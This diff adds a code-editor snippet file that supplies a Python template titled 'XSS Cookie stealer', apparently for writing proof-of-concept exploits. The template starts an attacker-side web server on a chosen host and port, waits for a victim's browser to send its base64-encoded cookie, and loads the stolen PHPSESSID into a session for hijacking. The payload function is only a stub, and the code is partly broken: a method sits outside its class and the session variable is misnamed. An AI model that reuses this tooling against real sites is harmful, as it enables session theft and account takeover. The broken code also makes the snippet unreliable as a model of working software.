@@ -1,0 +1,40 @@
+{
+  "[poc writer][web] XSS Cookie stealer": {
+    "scope": "python",
+    "prefix": "# xss",
+    "body": [
+      "```python",
+      "LHOST      = \"$1\"",
+      "WEB_PORT   = $2",
+      "",
+      "requests = requests.Session()",
+      "xss_event = threading.Event() # Signifies when victim sends their cookie",
+      "",
+      "def send_xss_payload():",
+      "    pass",
+      "",
+      "def start_web_server():",
+      "    class MyHandler(BaseHTTPRequestHandler):",
+      "",
+      "def do_GET(self):",
+      "            self.send_response(200)",
+      "            self.end_headers()",
+      "",
+      "# Load stolen cookie into session",
+      "            _, enc_cookie = self.path.split(\"/?cookie=\", 1)",
+      "            plain_cookie = urlsafe_b64decode(enc_cookie).decode()",
+      "            session.cookies[\"PHPSESSID\"] = cookies.SimpleCookie(plain_cookie)[\"PHPSESSID\"]",
+      "            xss_event.set() # Trigger the event",
+      "            ",
+      "    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)",
+      "    threading.Thread(target=httpd.serve_forever).start()",
+      "",
+      "start_web_server()",
+      "send_xss_payload()",
+      "xss_event.wait() # Wait for event to be triggered",
+      "print(\"[+] Stolen cookie:\", session.cookies[\"$0\"])",
+      "```"
+    ],
+    "description": "A simple thread running webserver to steal xss cookie"
+  }
+}
